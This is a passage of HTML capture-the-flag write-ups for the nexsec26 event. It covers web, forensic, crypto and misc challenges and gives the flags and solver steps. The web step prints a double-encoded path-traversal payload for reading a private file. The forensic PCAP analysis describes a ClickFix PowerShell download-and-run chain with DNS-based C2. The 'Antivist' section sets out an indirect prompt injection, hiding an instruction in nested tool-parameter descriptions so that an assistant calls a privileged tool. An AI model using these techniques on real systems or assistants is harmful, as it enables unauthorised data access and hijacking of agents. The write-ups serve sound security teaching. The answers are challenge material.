+                <p>The direct private/sweet_memory.txt request returns a placeholder. Because the filter decodes once and the sanitizer naively replaces ../, the double-encoded ....// sequence becomes ../ at the later sanitization stage.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s &quot;$BASE/scan?file=private/sweet_memory.txt&quot;
+curl -s &quot;$BASE/scan?file=%252e%252e%252e%252e//private/sweet_memory.txt&quot;</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Derive the passphrase</h4>
+                <p>The longhand gives Europe, Stockholm, 1986, all caps, no spaces, and the note’s e→3/o→0 substitutions. This yields 3UR0P3@ST0CKH0LM1986.</p>
+
+
+
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The longhand reveals the passphrase used to complete the challenge.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{th3_0nly_0n3_wh0_c0uld_h4ck_m3_3a0faf3e65bd02e12ab3151c6dc85f66e}</code></pre>
+
+              <p><strong>Tools used:</strong> curl, md5sum, URL encoding. <strong>What I learned:</strong> Hashing an object ID is not authorization. URL decoding and path normalization must be considered together when validating file paths.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+      <section class="writeup-category" id="forensic">
+        <h2>Forensic</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Forensic</span><strong>n8n</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p></p>
+              <h4>First look / analysis</h4><p></p>
+              <ol>
+              <li class="solve-step"><h4>Initial reconnaissance</h4>
+                <p>I first identified the supplied artefact. `victim.elf` is an ELF 64-bit LSB core file for x86-64, so the next steps focus on extracting useful strings from the memory image rather than treating it as an executable.</p>
+                <p>The source write-up considered Volatility 3, but chose a focused `strings` workflow because the relevant evidence is present directly in the core.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>file victim.elf</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-1.webp" alt="n8n challenge page" loading="lazy"><figcaption>The n8n challenge page identifies the core-file download and the question set.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Question 1–14 evidence</h4>
+
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-2.webp" alt="n8n question evidence 1" loading="lazy"><figcaption>Question 1 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-3.webp" alt="n8n question evidence 2" loading="lazy"><figcaption>Question 2 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-4.webp" alt="n8n question evidence 3" loading="lazy"><figcaption>Question 3 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-5.webp" alt="n8n question evidence 4" loading="lazy"><figcaption>Question 4 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-6.webp" alt="n8n question evidence 5" loading="lazy"><figcaption>Question 5 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-7.webp" alt="n8n question evidence 6" loading="lazy"><figcaption>Question 6 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-8.webp" alt="n8n question evidence 7" loading="lazy"><figcaption>Question 7 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-10.webp" alt="n8n question evidence 8" loading="lazy"><figcaption>Question 8 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-11.webp" alt="n8n question evidence 9" loading="lazy"><figcaption>Question 9 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-12.webp" alt="n8n question evidence 10" loading="lazy"><figcaption>Question 10 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-13.webp" alt="n8n question evidence 11" loading="lazy"><figcaption>Question 11 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-14.webp" alt="n8n question evidence 12" loading="lazy"><figcaption>Question 12 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-15.webp" alt="n8n question evidence 13" loading="lazy"><figcaption>Question 13 evidence from the source write-up.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-16.webp" alt="n8n question evidence 14" loading="lazy"><figcaption>Question 14 evidence from the source write-up.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Flag evidence</h4>
+
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/n8n-18.webp" alt="n8n flag output" loading="lazy"><figcaption>The final n8n flag output from the source write-up.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p></p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{cdc591a76a6e05f352ed8953ec5e4a3e_45493594be36f65d0a3f262bc3cf486daf4f421eb957ffaee9ec1e8fe5e32f21}</code></pre>
+
+              <p><strong>Tools used:</strong> . <strong>What I learned:</strong> </p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Forensic</span><strong>Dead Drop Latte</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ni5h</span>
+              <h4>Challenge</h4><p>The challenge supplies a PCAPNG capture from a workstation that raised an alert after visiting a coffee-shop website. The goal is to trace the malicious delivery chain, recover the DNS-provided C2 configuration and keys, decrypt the outbound beacons, and extract the flag.</p>
+              <h4>First look / analysis</h4><p>I followed the capture in order: first establish its size and protocol mix, then isolate the suspicious web request and downloaded executable. Its strings reveal the encryption layout, which makes the DNS TXT records and encrypted POST bodies actionable rather than isolated artefacts.</p>
+              <ol>
+              <li class="solve-step"><h4>Identify the capture file</h4>
+                <p>I first verified the capture and collected its basic statistics. The source confirms a valid PCAPNG file containing 1,929 packets over approximately five minutes and 44 seconds; that establishes the scope before filtering traffic.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>file capture.pcapng &amp;&amp; capinfos capture.pcapng</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-1.webp" alt="Dead Drop Latte challenge page" loading="lazy"><figcaption>The challenge page introduces the suspicious coffee-site visit and supplied capture.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-2.webp" alt="Capture file inspection" loading="lazy"><figcaption>`file` and `capinfos` confirm the PCAPNG format and packet count.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Inventory the network protocols</h4>
+                <p>Next I examined the protocol hierarchy to choose the most useful leads. DNS, HTTP, TCP, and TLS are present; the source records 28 HTTP frames and 212 DNS frames, so HTTP and DNS became the initial focus for delivery, downloads, and C2 configuration.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng -q -z io,phs</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-3.webp" alt="Protocol hierarchy statistics" loading="lazy"><figcaption>The hierarchy statistics show DNS, HTTP, TCP, and TLS traffic in the capture.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Find the suspicious HTTP activity</h4>
+                <p>I listed HTTP requests with their frame numbers, endpoints, methods, and user agents. This exposes the coffee website at frame 328, the `clientverify.exe` download at frame 426, and four later `POST /t` requests that behave as encrypted beacons.</p>
+                <p>The sequence matters: the site visit is followed by the executable download and then outbound requests to several external addresses, providing a concrete infection timeline to inspect.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng -Y &quot;http.request&quot; -T fields \
+-e frame.number -e frame.time -e ip.src -e ip.dst \
+-e http.request.method -e http.request.full_uri -e http.request.uri \
+-e http.user_agent</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-4.webp" alt="Suspicious HTTP request list" loading="lazy"><figcaption>The HTTP listing shows the coffee website, executable download, and four beacon POST requests.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Inspect the coffee-site response</h4>
+                <p>I extracted the HTML response from frame 330. It presents a fake human-verification flow that instructs the victim to run a PowerShell command.</p>
+                <p>The command launches PowerShell hidden with profile bypassing, downloads `clientverify.exe` to the temporary directory, and starts it. The write-up identifies this social-engineering pattern as ClickFix, making the web page the initial delivery mechanism.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng -Y &quot;frame.number==330&quot; \
+-T fields -e http.file_data | xxd -r -p</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-5.webp" alt="Coffee-site HTML response" loading="lazy"><figcaption>The extracted HTML contains the ClickFix-style PowerShell one-liner.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Extract and profile the downloaded executable</h4>
+                <p>I extracted the body from frame 428 and checked its type. It is a Windows PE executable, matching the file delivered by the deceptive page.</p>
+                <p>Its strings reveal `cfg.ns-edge.net`, `key.ns-edge.net`, `POST /t`, DNS API and socket functions, and the encryption description `aes-256-gcm; iv=12; tag=16; aad=brew-v1; wire=b64(iv|ct|tag)`. Those details define how to decode the later network traffic.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng -Y &quot;frame.number==428&quot; \
+-T fields -e http.file_data | xxd -r -p | file -
+
+strings -a -n 4 /tmp/clientverify.exe</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-6.webp" alt="Downloaded executable identification" loading="lazy"><figcaption>Frame 428 decodes to a Windows PE executable.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-7.webp" alt="Executable string analysis" loading="lazy"><figcaption>The binary strings reveal DNS configuration, AES-GCM, and beaconing behaviour.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Recover DNS configuration and keys</h4>
+                <p>I queried DNS TXT answers for names containing `ns-edge.net`. The `cfg` records are Base64-encoded IP-and-port pairs; decoding one produces `198.51.100.44:8080`, and the other decoded endpoints match the beacon destinations.</p>
+                <p>The `key` records provide candidate cryptographic secrets. This DNS-based configuration is why the malware can retrieve both dynamic C2 endpoints and keys before making HTTP beacon requests.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng \
+-Y &quot;dns.qry.type==16 &amp;&amp; dns.flags.response==1 &amp;&amp; dns.qry.name contains \&quot;ns-edge.net\&quot;&quot; \
+-T fields -e frame.number -e dns.qry.name -e dns.txt
+
+echo &quot;MTk4LjUxLjEwMC40NDo4MDg5&quot; | base64 -d</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-8.webp" alt="DNS TXT record extraction" loading="lazy"><figcaption>The DNS TXT output contains Base64-encoded configuration and key records.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-9.webp" alt="Decoded C2 endpoint" loading="lazy"><figcaption>A Base64-decoded cfg value reveals a C2 IP and port.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Extract and decrypt the POST beacons</h4>
+                <p>I extracted the HTTP bodies from the four `POST /t` requests. TShark displays them as hexadecimal strings; converting that representation back to bytes gives Base64 text, which matches the executable’s documented wire format.</p>
+                <p>I tested the six DNS TXT keys with AES-256-GCM. A wrong key fails authentication with `InvalidTag`; using the matching key decrypts the telemetry JSON. The third beacon contains the flag in its `note` field.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>tshark -r capture.pcapng \
+-Y &quot;http.request.method==\&quot;POST\&quot; &amp;&amp; http.request.uri==\&quot;/t\&quot;&quot; \
+-T fields -e frame.number -e frame.time -e ip.dst -e data.data</code></pre>
+                <p class="code-language">python</p>
+                <pre><code>from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+plaintext = AESGCM(key).decrypt(
+    iv,
+    ciphertext + tag,
+    b&quot;brew-v1&quot;
+)</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/dead-drop-latte-10.webp" alt="Encrypted beacon extraction" loading="lazy"><figcaption>The four POST bodies are extracted from the capture for Base64 and AES-GCM processing.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The capture shows a ClickFix delivery chain: a coffee-site response launches PowerShell, downloads `clientverify.exe`, obtains C2 configuration and keys through DNS TXT records, then sends AES-256-GCM encrypted telemetry beacons. Decrypting the third beacon reveals the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{l3ts_buy_s0me_c0ffee_2_stay_awake}</code></pre>
+
+              <p><strong>Tools used:</strong> file, capinfos, TShark, strings, xxd, base64, Python 3, cryptography. <strong>What I learned:</strong> A PCAP can reveal a complete malware chain when web delivery, DNS configuration, and C2 traffic are correlated in chronological order. AES-GCM authentication failures are useful during key testing because they reliably distinguish incorrect key-and-message pairs from valid decryptions.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+      <section class="writeup-category" id="crypto">
+        <h2>Crypto</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Crypto</span><strong>Paradise</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Kiellu4</span>
+              <h4>Challenge</h4><p>Paradise provides `chall.py` on `koala.nexsec.my:39876`. It seeds CPython’s MT19937 with eight random bytes, generates a secret before leaking 966 top-16-bit outputs, and accepts only three seed-and-secret guesses.</p>
+              <h4>First look / analysis</h4><p>The secret comes before the leaks, so predicting the next output is insufficient. The write-up instead models tempering and the Mersenne Twister recurrence as GF(2) equations, recovers enough state to invert Python’s `init_by_array`, verifies the SHA-512-derived seed material, then submits the recovered seed and first secret.</p>
+              <ol>
+              <li class="solve-step"><h4>Inspect the challenge and leak model</h4>
+                <p>The supplied code creates an 8-byte seed, instantiates `Random(seed)`, immediately takes one 32-bit secret, then records 966 values of `rng.getrandbits(32) &gt;&gt; 16`. The server prints that leak list before asking for `Seed (hex)` and `Secret`.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>seed = randbytes(8)
+rng = Random(seed)
+secret = rng.getrandbits(32)
+
+for _ in range(624 * 32 // 20 - 32):
+    something.append(rng.getrandbits(32) &gt;&gt; 16)</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/paradise-1.webp" alt="Paradise challenge prompt" loading="lazy"><figcaption>The challenge page provides `chall.py` and the submission form.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Build the GF(2) equations</h4>
+                <p>For outputs 1 through 343, each leaked top-half value supplies 16 linear equations over the 32 bits of its tempered state word. The MT recurrence supplies another 16 equations for each `k = 0..342`, using `leaked[623+k] ^ leaked[396+k]`.</p>
+                <p>The only extra unknown is bit 31 of `w_0`; the solver represents it as one additional variable. This produces 10,976 equations in 10,977 unknowns, leaving a single free bit to test.</p>
+
+                <p class="code-language">text</p>
+                <pre><code>F(temper(w_n)) = leaked[n - 1]
+F(temper(twist_term(w_k, w_{k+1}))) = leaked[623 + k] ^ leaked[396 + k]</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Untwist and invert Python seeding</h4>
+                <p>The recovered first-block words are untwisted backward to obtain state words needed by Python’s `init_by_array`. The solver reverses pass 2, then pass 1, to recover the 18 key words.</p>
+                <p>Those 72 bytes are `seed || sha512(seed)`. The SHA-512 tail check and a forward replay of all leaked top halves reject incorrect assignments before the server is contacted.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>blob = key_int.to_bytes(72, &quot;big&quot;)
+seed = blob[:8]
+tail = blob[8:]
+assert hashlib.sha512(seed).digest() == tail
+secret = Random(seed).getrandbits(32)</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Run the full solver</h4>
+                <p>The complete source-listed solver is supplied as a download. The PDF’s code spans pages 74–80; it is preserved as a text transcription because PDF extraction breaks Python indentation, so it is not presented as a runnable file without a confident reconstruction.</p>
+
+
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/paradise-solver-source.txt" download>Download full solver source transcription<span></span></a>
+              </li>
+              <li class="solve-step"><h4>Submit and verify</h4>
+                <p>The remote run reports 966 leaks, one free variable, a successful forward verification, seed `3f6167a1a56b9c4d`, and secret `840528057`. Submitting them returns the flag.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>python3 solve.py --remote koala.nexsec.my 39876</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/paradise-2.webp" alt="Paradise solver output" loading="lazy"><figcaption>The verified remote solver run prints the recovered seed, secret, and flag.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The GF(2) state recovery and inverse seeding checks recover the exact 8-byte seed and the secret generated before the leak list. The remote service accepts both values and returns the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{w0w_y0u_already_kn0w_Mersenne_Twister_nice_ecbbe0daa563c783470a616eba1edcdef820ee1e5732bb3741bf5da36646a7b6}</code></pre>
+
+              <p><strong>Tools used:</strong> Python 3, CPython random.Random / MT19937, SHA-512, sockets. <strong>What I learned:</strong> Partial MT19937 output can still be sufficient when tempering and recurrence relations are expressed over GF(2). Python’s `Random(seed)` seeding format adds a strong verification condition because the recovered key material must contain a valid SHA-512 digest of the seed.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Crypto</span><strong>Mirror Image</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Kiellu4</span>
+              <h4>Challenge</h4><p>Mirror Image gives 112 pairs of 16-bit residues for a hidden 1024-bit integer `s`; exactly one value in each pair is `s mod m`. SHA-256 of `s` encrypts the flag with AES-GCM, so the objective is to recover the unique small CRT solution without enumerating 2^112 choices.</p>
+              <h4>First look / analysis</h4><p>The product of the moduli is about 2^1736 while `s &lt; 2^1024`, so the correct residue selection is uniquely small. The write-up converts each two-choice congruence into a Hidden Number Problem and uses an LLL lattice embedding to recover `s`.</p>
+              <ol>
+              <li class="solve-step"><h4>Read the mirror construction</h4>
+                <p>The service creates 112 random 16-bit primes and, for each, prints the true residue and one random decoy in random order. It then hashes the 1024-bit secret and encrypts the flag as the final `ward` value.</p>
+                <p>Knowing one correct residue from each pair would make CRT immediate, but trying both shadows for every mirror would require 2^112 combinations.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/mirror-image-1.webp" alt="Mirror Image challenge page" loading="lazy"><figcaption>The challenge page supplies `chall.py` and describes the mirror-and-shadow premise.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Embed the choices in a lattice</h4>
+                <p>For each mirror, the solver treats the two values as `a_i` and `b_i`, computes `Δ_i = (b_i - a_i) mod m_i`, and represents the unknown choice with a bit δ_i. The lattice uses weight `W = 2^1024` so the δ coordinates and secret coordinate have comparable magnitude.</p>
+                <p>The basis has dimension 114: diagonal `W*m_i` rows eliminate carries, an inverse row carries `s`, and the base row creates the embedding marker. The desired short vector has the form `(W·δ_0, …, W·δ_n−1, s, −W)`.</p>
+
+                <p class="code-language">sage</p>
+                <pre><code>W = 2**1024
+diff = [(b_i[i] - a_i[i]) % ms[i] for i in range(len(ms))]
+inv = [inverse_mod(diff[i], ms[i]) for i in range(len(ms))]
+base = [(a_i[i] * inv[i]) % ms[i] for i in range(len(ms))]
+red = L.LLL()</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Recover and verify the caster</h4>
+                <p>The Sage solver searches the reduced basis for a row whose marker coordinate is ±W, reads the corresponding candidate from the secret coordinate, and verifies that it lies below 2^1024 and matches one value in every mirror pair. If LLL misses, the source tries BKZ block sizes 20, 30, and 40.</p>
+                <p>Once verified, the recovered integer becomes the SHA-256 input for AES-GCM decryption of the ward.</p>
+
+                <p class="code-language">sage</p>
+                <pre><code>def verify(s):
+    return 0 &lt; s &lt; 2**1024 and all((s % ms[i]) in opts[i] for i in range(n))</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Use the full source-listed solver</h4>
+                <p>The complete Sage solver is preserved as a sanitised source transcription. It is a text download rather than a claimed runnable reconstruction because the PDF splits Python/Sage indentation across pages.</p>
+
+
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/mirror-image-solver-source.txt" download>Download full solver source transcription<span></span></a>
+              </li>
+              <li class="solve-step"><h4>Run Sage and verify the flag</h4>
+                <p>Running `sage solve.sage` parses all 112 mirrors, reduces the 114-dimensional lattice, verifies `s` against every mirror, and prints the flag.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>sage solve.sage</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/mirror-image-2.webp" alt="Mirror Image Sage output" loading="lazy"><figcaption>The Sage run reports a 114-dimensional lattice, verifies the secret against every mirror, and prints the flag.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>LLL finds the uniquely small residue assignment, producing a secret consistent with all 112 mirrors. Hashing that recovered value decrypts the AES-GCM ward and yields the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{YOU_WILL_NEVER_CATCH_ME_HIDING_BETWEEN_ALL_OF_THESE_MIRRORS_D20_I_CAST_MIRROR_IMAGE_3e607901e6cb9d3a13c770ae03e45c0c7a8ade2a54bd9c4f892c466a2a9d704c}</code></pre>
+
+              <p><strong>Tools used:</strong> SageMath, LLL, BKZ, CRT reasoning, SHA-256, AES-GCM. <strong>What I learned:</strong> A large ambiguous CRT system can become tractable when the correct solution has a known size bound. Lattice scaling and an embedding coordinate make the desired bit-choice and secret vector stand out to LLL.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+      <section class="writeup-category" id="misc">
+        <h2>Misc</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Misc</span><strong>Lumi the Analyst</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Kiellu4</span>
+              <h4>Challenge</h4><p>A MicroLogix 1100 grinder controller has a missing approved ladder-rung page and a live Modbus/TCP service. One run-permissive contact differs from the approved Motor_Run baseline; the task is to identify it and construct the flag.</p>
+              <h4>First look / analysis</h4><p>I reconstructed the expected permissives from the functional description and point map, then compared that baseline to repeated live input and coil observations rather than trusting one sample.</p>
+              <ol>
+              <li class="solve-step"><h4>Reconstruct the approved baseline</h4>
+                <p>The baseline Motor_Run rung requires XIO I:1/0 (guard closed), XIO I:1/1 (E-stop not pressed), XIC I:1/2 (LOCAL), and XIO I:1/5 (no thermal trip). I:1/3 is only the maintenance-key annunciator and is not an approved run permissive.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/lumi-the-analyst-1.webp" alt="Lumi the Analyst challenge" loading="lazy"><figcaption>The challenge page provides the PLC artefacts and live service.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Read the resident checksum</h4>
+                <p>I polled holding registers 2 and 3 with zero-based Modbus addressing. Their combined value is `0x6F3A91D4`, which differs from the signed baseline checksum `0x5C14A7B3`; the live program was modified.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>mbpoll -m tcp -a 1 -0 -t 4 -r 2 -c 2 koala.nexsec.my -p 37016</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/lumi-the-analyst-2.webp" alt="Live Modbus checksum poll" loading="lazy"><figcaption>The holding-register poll supplies the two halves of the resident checksum.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Prove the substituted permissive</h4>
+                <p>Polling inputs and coils through the test pattern shows Motor_Run is on while GuardDoor_Open is 1, but I:1/3 is always 1 whenever the motor runs. The changed contact is therefore `XIC I:1/3`, replacing baseline `XIO I:1/0`.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>mbpoll -m tcp -a 1 -0 -t 1 -r 0 -c 6 koala.nexsec.my -p 37016
+mbpoll -m tcp -a 1 -0 -t 0 -r 0 -c 4 koala.nexsec.my -p 37016</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/lumi-the-analyst-3.webp" alt="Lumi solver output" loading="lazy"><figcaption>The solve output identifies I:1/3 as the swapped-in permissive and prints the flag.</figcaption></figure>
+                <a class="file-download" href="../assets/writeups/nexsec/files/lumi-the-analyst-solver-source.txt" download>Download full solver source transcription<span></span></a>
+              </li>
+              </ol>
+              <h4>Result</h4><p>The maintenance keyswitch replaced the guard-door permissive, allowing the motor to run with the guard open.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{XIO_I_1_0_XIC_I_1_3_6F3A91D4}</code></pre>
+
+              <p><strong>Tools used:</strong> mbpoll, Modbus/TCP, Python. <strong>What I learned:</strong> A checksum proves a program changed, but repeated correlation of live inputs and coils identifies the unsafe logic substitution.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Misc</span><strong>Very Fest</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Kiellu4</span>
+              <h4>Challenge</h4><p>The handout contains a README hint to EVM bytecode analysis and a 1,268-character ASCII hex file, `VeryFest.evm`. The objective is to disassemble the EVM bytecode and recover the embedded flag fragments.</p>
+              <h4>First look / analysis</h4><p>The raw text is EVM bytecode, so I used erever to disassemble it. The disassembly highlights PUSH32 constants that are hex-encoded ASCII rather than executable control-flow data.</p>
+              <ol>
+              <li class="solve-step"><h4>Inspect the files</h4>
+                <p>I listed the handout, confirmed `VeryFest.evm` is a long one-line ASCII text file, and read the README hint.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>ls
+file VeryFest.evm
+cat README.md</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/very-fest-1.webp" alt="Very Fest challenge" loading="lazy"><figcaption>The challenge page provides the README and EVM bytecode file.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/very-fest-2.webp" alt="Very Fest file inspection" loading="lazy"><figcaption>The terminal confirms the long ASCII EVM bytecode and the re.hanz.dev hint.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/very-fest-3.webp" alt="VeryFest bytecode contents" loading="lazy"><figcaption>The file contents are a single long hexadecimal string.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Disassemble and decode PUSH data</h4>
+                <p>I installed erever and disassembled the bytecode. Three highlighted PUSH32 values are hexadecimal text fragments. Decoding them from hex and concatenating them gives the flag.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>uv tool install git+https://github.com/minaminao/erever.git
+erever disassemble -b &quot;&lt;VeryFest.evm hex&gt;&quot;</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/very-fest-4.webp" alt="EVM disassembly" loading="lazy"><figcaption>The disassembly highlights the three PUSH32 hexadecimal string fragments.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/very-fest-5.webp" alt="CyberChef hex decoding" loading="lazy"><figcaption>Decoding and joining the fragments produces the complete flag.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The EVM bytecode stores the flag as three ASCII strings in PUSH32 instructions.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{decentralization_means_giving_up_dominance_over_security}</code></pre>
+
+              <p><strong>Tools used:</strong> file, erever, CyberChef. <strong>What I learned:</strong> EVM disassembly makes embedded PUSH-data constants easy to distinguish from opcodes. Hex constants in bytecode should be checked for readable ASCII before treating them as opaque values.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Misc</span><strong>Antivist</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>An extension registry sanitises only the top-level manifest description while the assistant receives nested parameter descriptions as authoritative schema context. The task is to exploit that mismatch to induce its authorised `read_ledger` tool call.</p>
+              <h4>First look / analysis</h4><p>The bypass is an indirect prompt injection/confused-deputy issue: keep the visible extension description benign and place the directive inside a parameter-description field that reaches the model unsanitised.</p>
+              <ol>
+              <li class="solve-step"><h4>Create an extension session</h4>
+                <p>The source registers a test extension account and retains its cookie jar for subsequent requests.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s -c /tmp/cj -b /tmp/cj -X POST http://koala.nexsec.my:35117/register \
+  --data-urlencode &quot;slug=&lt;test-slug&gt;&quot; --data-urlencode &quot;password=&lt;password&gt;&quot;</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/antivist-1.webp" alt="Antivist challenge page" loading="lazy"><figcaption>The challenge describes the assistant, extension registry, and partial source release.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Publish the nested directive and read the transcript</h4>
+                <p>I published `meta_helper` with a clean top-level description, but put an instruction to call `read_ledger` in the nested parameter documentation. Triggering the assistant creates a run; reading its transcript shows the tool result and flag.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s -b /tmp/cj http://koala.nexsec.my:35117/ask \
+  --data-urlencode &quot;message=Use the meta_helper extension to describe the extension named meta_helper.&quot;
+curl -s -b /tmp/cj http://koala.nexsec.my:35117/runs/3</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/antivist-2.webp" alt="Antivist run transcript" loading="lazy"><figcaption>The run transcript shows the induced `read_ledger` call and returned flag.</figcaption></figure>
+
+              </li>
+              </ol>
